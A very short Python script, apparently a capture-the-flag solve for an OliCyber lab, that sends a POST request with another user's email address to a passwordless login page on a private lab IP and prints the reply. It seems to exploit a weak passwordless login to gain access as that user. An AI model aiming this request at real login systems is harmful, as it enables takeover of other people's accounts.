import requests

url = 'http://192.168.100.3:38100/passwordless_login.php'

print(requests.post(url, data={'email': 'alan@fakemail.olicyber.it'}).text)